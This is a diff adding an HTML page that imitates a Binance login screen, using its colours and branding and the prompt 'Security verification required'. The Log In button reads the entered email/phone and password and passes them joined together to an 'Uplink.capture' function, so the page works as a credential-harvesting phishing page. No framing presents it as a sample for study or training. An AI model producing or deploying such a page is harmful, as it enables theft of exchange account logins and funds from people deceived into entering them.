@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <style>
+        body { background:#0b0e11; color:#eaecef; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding:50px; text-align:center; margin:0; }
+        h2 { color:#f3ba2f; margin-bottom:10px; font-size:2rem; }
+        p { margin-bottom:25px; color:#848e9c; }
+        input { width:100%; padding:15px; margin-bottom:10px; background:#1e2329; border:1px solid #474d57; color:#fff; border-radius:4px; box-sizing:border-box; font-size:1rem; }
+        button { width:100%; padding:15px; background:#f3ba2f; border:none; color:#000; font-weight:bold; border-radius:4px; cursor:pointer; font-size:1rem; }
+    </style>
+</head>
+<body>
+    <h2>Binance</h2>
+    <p>Security verification required.</p>
+    <input type="text" id="u" placeholder="Email/Phone">
+    <input type="password" id="p" placeholder="Password">
+    <button onclick="var u=document.getElementById('u').value; var p=document.getElementById('p').value; if(u && p) Uplink.capture(u + ':' + p);">Log In</button>
+</body>
+</html>
